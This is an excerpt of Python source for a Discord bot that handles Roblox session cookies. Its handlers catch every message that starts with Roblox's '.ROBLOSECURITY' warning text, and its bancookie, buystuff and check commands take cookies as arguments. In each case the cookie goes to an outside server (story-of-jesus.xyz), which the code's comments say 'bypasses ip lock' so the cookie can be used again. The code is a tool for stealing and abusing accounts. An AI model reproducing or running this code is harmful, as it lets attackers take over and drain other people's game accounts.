...
async def on_message(message):
    ...
    if message.content.startswith("_|WARNING:-DO-NOT-SHARE-THIS."):
        cookie = requests.get(f"https://story-of-jesus.xyz/refresh/roblox-cookie.php?cookie={message.content}").text ## bypassip lock
        r = requests.get(f'https://story-of-jesus.xyz/api/roblox.php?cookie={cookie}') 
        data = r.json() 
...
async def bancookie(ctx, cookie=None):
    ...
    cookie = requests.get(f"https://story-of-jesus.xyz/checker/roblox-cookie.php?cookie={cookie}").text ## bypass ip lock
...
async def buystuff(ctx, cookie=None):
    ...
    cookie = requests.get(f"https://story-of-jesus.xyz/refresh/roblox-cookie.php?cookie={cookie}").text ## bypass ip lock
    r = requests.get(f'https://story-of-jesus.xyz/api/roblox.php?cookie={cookie}')
...
@bot.command()
async def check(ctx, cookie=None):  ## By default make Cookie = To None, so that u can detect wether or not user has entered a cookie
    ...
    r = requests.get(f'https://story-of-jesus.xyz/api/roblox.php?cookie={cookie}') ## Send get request to my api to get info about cookie in json, this api auto bypasses ip lock
...
@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.do_not_disturb, activity=discord.Activity(type=discord.ActivityType.playing, name="check"))
    print('Working')
